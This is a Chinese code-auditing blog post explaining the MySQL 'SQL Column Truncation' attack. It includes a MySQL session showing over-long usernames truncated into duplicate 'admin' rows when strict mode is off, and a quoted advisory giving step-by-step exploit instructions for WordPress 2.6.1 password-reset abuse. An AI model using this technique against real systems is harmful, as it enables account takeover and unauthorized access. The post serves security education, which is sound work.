---
author: ww
comments: true
date: 2015-12-30 03:27:43+00:00
layout: post
link: http://www.gl6.cc/blog/%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1%e3%80%80sql-column-truncation.html
slug: '%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1%e3%80%80sql-column-truncation'
title: '[代码审计]　SQL Column Truncation'
wordpress_id: 413
categories:
- database
- safe
- uncategorized
tags:
- mysql
- 代码审计
---

2008年8月，Stefan Esser提出了一种名为“SQL Column Truncation”的攻击方式，在某些情况下，将会导致发生一些安全问题。

在MySQL的配置选项中，有一个sql_mode选项。当MySQL的sql-mode设置为default时，即没有开启STRICT_ALL_TABLES选项时，MySQL对于用户插入的超长值只会提示warn-ing，而不是error（如果是error则插入不成功），这可能会导致发生一些“截断”问题。

测试过程如下（MySQL 5）。

首先开启strict模式。

sql-
mode="STRICT_TRANS_TABLES,NO_AUTO_CREATE_USE
R,NO_ENGINE_SUBSTITUTION"
在strict模式下，因为输入的字符串超出了长度限制，因此数据库返回一个error信息，同时数据插入不成功。

mysql> create table 'truncated_test' (
-> `id` int(11) NOT NULL auto_increment,
-> `username` varchar(10) default NULL,
-> `password` varchar(10) default NULL,
-> PRIMARY KEY ('id')
-> )DEFAULT CHARSET=utf8;
Query OK, 0 rows affected (0.08 sec)
mysql> select * from truncated_test;
Empty set (0.00 sec)
mysql> show columns from truncated_test;
+----------+-------------+------+-----
+---------+----------------+
| Field | Type | Null | Key |
Default | Extra |
+----------+-------------+------+-----
+---------+----------------+
| id | int(11) | NO | PRI |
NULL | auto_increment |
| username | varchar(10) | YES | |
NULL | |
| password | varchar(10) | YES | |
NULL | |
+----------+-------------+------+-----
+---------+----------------+
3 rows in set (0.00 sec)
mysql> insert into
truncated_test('username','password')
values("admin","pass");
Query OK, 1 row affected (0.03 sec)
mysql> select * from truncated_test;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 1 | admin | pass |
+----+----------+----------+
1 row in set (0.00 sec)
mysql> insert into
truncated_test('username','password')
values("admin x",
"new_pass");
ERROR 1406 (22001): Data too long for
column 'username' at row 1
mysql> select * from truncated_test;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 1 | admin | pass |
+----+----------+----------+
1 row in set (0.00 sec)
当关闭了strict选项时：

sql-
mode="NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUT
ION"
数据库只返回一个warning信息，但数据插入成功。

mysql> select * from truncated_test;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 1 | admin | pass |
+----+----------+----------+
1 row in set (0.00 sec)
mysql> insert into
truncated_test('username','password')
values("admin x",
-> "new_pass");
Query OK, 1 row affected, 1 warning (0.01
sec)
mysql> select * from truncated_test;
+----+------------+----------+
| id | username | password |
+----+------------+----------+
| 1 | admin | pass |
| 2 | admin | new_pass |
+----+------------+----------+
2 rows in set (0.00 sec)
mysql>
此时如果插入两个相同的数据会有什么后果呢？根据不同业务可能会造成不同的逻辑问题。比如类似下面的代码：

$userdata = null;
if (isPasswordCorrect($username, $password))
{
$userdata = getUserDataByLogin($username);
...
}
它使用这条SQL语句来验证用户名和密码：

SELECT username FROM users WHERE username
= ? AND passhash = ?
但如果攻击者插入一个同名的数据，则可以通过此认证。在之后的授权过程中，如果系统仅仅通过用户名来进行授权：

SELECT * FROM users WHERE username = ?
则可能会造成一些越权访问。

在这个问题公布后不久，WordPress就出现了一个真实的案例——

注册一个用户名为“admin（55个空格）x”的用户，就可以修改原管理员的密码了。

Vulnerable Systems:
* WordPress version 2.6.1
Exploit:
1. Go to URL: server.com/wp-login.php?
action=register
2. Register as:
login: admin x (the user admin[55 space
chars]x)
email: your email
Now, we have duplicated 'admin' account in
database
3. Go to URL: server.com/wp-login.php?
action=lostpassword
4. Write your email into field and submit
this form
5. Check your email and go to reset
confirmation link
6. Admin's password changed, but new
password will be send to correct admin email
Additional Information:
The information has been provided by irk4z.
The original article can be found at:
http://irk4z.wordpress.com/
但这个漏洞并未造成严重的后果，因为攻击者在此只能修改管理员的密码，而新密码仍然会发送到管理员的邮箱。尽管如此，我们并不能忽视“SQLColumn Truncation”的危害，因为也许下一次漏洞被利用时，就没有那么好的运气了。
